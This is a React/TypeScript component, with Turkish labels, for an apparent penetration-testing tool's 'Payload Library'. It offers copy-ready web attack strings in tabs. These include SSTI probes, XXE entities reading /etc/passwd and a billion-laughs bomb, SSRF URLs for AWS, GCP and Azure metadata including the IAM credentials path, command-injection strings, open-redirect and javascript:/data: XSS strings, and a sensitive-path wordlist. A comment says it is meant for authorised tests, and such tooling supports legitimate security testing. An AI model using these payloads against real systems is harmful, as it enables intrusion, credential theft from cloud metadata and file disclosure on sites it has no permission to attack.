import { useState } from 'react';
import { copyText } from './copy';

// Payload kutuphanesi — sekmeli, kopyala-hazir proplar:
// SSTI sondalari, XXE, SSRF(meta uclar), Komut enjeksiyonu, Acik yonlendirme,
// mini wordlist (disa aktarilabilir). Yetkili testler icin.
const TABS: Record<string, { label: string; items: [string, string][] }> = {
  ssti: {
    label: 'SSTI',
    items: [
      ['Twig/PHP {{7*7}}', '{{7*7}}'],
      ['Jinja2 {{7*7}}', '{{7*7}}'],
      ['Tornado ${7*7}', '${7*7}'],
      ['ERB #{7*7}', '#{7*7}'],
      ['Smarty {$smarty.version}', '{$smarty.version}'],
      ['Razor @(7*7)', '@(7*7)'],
    ],
  },
  xxe: {
    label: 'XXE',
    items: [
      ['Dosya okuma', '<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]><x>&f;</x>'],
      ['Hata-bazli', '<!DOCTYPE x [<!ENTITY % a SYSTEM "file:///etc/passwd"> %a;]>'],
      ['SSRF', '<!DOCTYPE x [<!ENTITY s SYSTEM "http://169.254.169.254/">]><x>&s;</x>'],
      ['Milyar gulmece', '<!DOCTYPE lolz [<!ENTITY lol "lollollol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>'],
    ],
  },
  ssrf: {
    label: 'SSRF',
    items: [
      ['AWS metadata', 'http://169.254.169.254/latest/meta-data/'],
      ['AWS rol', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
      ['GCP metadata', 'http://metadata.google.internal/computeMetadata/v1/'],
      ['Azure metadata', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
      ['DNS rebinding', 'http://0.0.0.0/'],
      ['Gopher bypass', 'gopher://127.0.0.1:80/_GET%20/'],
    ],
  },
  cmdi: {
    label: 'Komut',
    items: [
      ['Linux id', ';id;#'],
      ['Linux pipe', '| id'],
      ['Linux AND', '&& id'],
      ['Linux $()', '$(id)'],
      ['Linux backtick', '`id`'],
      ['Windows whoami', '& whoami'],
      ['Windows pipe', '| whoami'],
      ['PowerShell', ';powershell -c whoami'],
    ],
  },
  redirect: {
    label: 'Yönlendirme',
    items: [
      ['Cift slash', '//evil.com'],
      ['Backslash', '/\\evil.com'],
      ['URL kodlu', '%2f%2fevil.com'],
      ['javascript', 'javascript:alert(1)'],
      ['data', 'data:text/html,<script>alert(1)</script>'],
      ['Parametre kirma', '?next=evil.com%2f..%2f'],
    ],
  },
  wordlist: {
    label: 'Mini wordlist',
    items: [
      ['admin', 'admin'], ['login', 'login'], ['dashboard', 'dashboard'], ['api', 'api'],
      ['.git/HEAD', '.git/HEAD'], ['.env', '.env'], ['wp-admin', 'wp-admin'],
      ['phpinfo.php', 'phpinfo.php'], ['server-status', 'server-status'], ['actuator', 'actuator'],
      ['graphql', 'graphql'], ['swagger', 'swagger'], ['console', 'console'], ['backup.zip', 'backup.zip'],
    ],
  },
};

export default function PayloadLibrary() {
  const [tab, setTab] = useState('ssti');
  const [copied, setCopied] = useState<string | null>(null);
  const [copiedAll, setCopiedAll] = useState(false);

  const copy = async (v: string) => {
    if (await copyText(v)) { setCopied(v); setTimeout(() => setCopied(null), 1000); }
  };
  const copyAll = async () => {
    if (await copyText(TABS[tab].items.map(([, v]) => v).join('\n'))) {
      setCopiedAll(true);
      setTimeout(() => setCopiedAll(false), 1200);
    }
  };

  return (
    <div className="rounded-2xl border border-[#1E1E1E] bg-[#0A0A0A] p-5">
      <div className="flex items-center justify-between">
        <h3 className="text-[14px] font-bold text-white">Payload Kütüphanesi</h3>
        <button onClick={copyAll} className="rounded-lg border border-[#2A2A2A] px-3 py-1 text-[12px] text-[#CCC] hover:text-white">
          {copiedAll ? 'Kopyalandı ✓' : 'Sekmeyi kopyala'}
        </button>
      </div>
      <div className="mt-3 flex flex-wrap gap-1.5">
        {Object.entries(TABS).map(([k, t]) => (
          <button key={k} onClick={() => setTab(k)}
            className={`rounded-full border px-3 py-1 text-[12px] ${tab === k ? 'border-[#FF9F0A] text-white' : 'border-[#2A2A2A] text-[#AAA] hover:text-white'}`}>
            {t.label}
          </button>
        ))}
      </div>
      <div className="mt-3 max-h-56 space-y-1.5 overflow-y-auto">
        {TABS[tab].items.map(([label, v]) => (
          <button key={label} onClick={() => copy(v)} title="Kopyalamak icin tikla"
            className="flex w-full items-center justify-between gap-2 rounded-lg bg-[#141414] px-3 py-1.5 text-left hover:bg-[#1E1E1E]">
            <span className="text-[12px] text-[#888]">{label}</span>
            <span className="truncate font-mono text-[12px] text-[#DDD]">{copied === v ? 'kopyalandı ✓' : v}</span>
          </button>
        ))}
      </div>
    </div>
  );
}
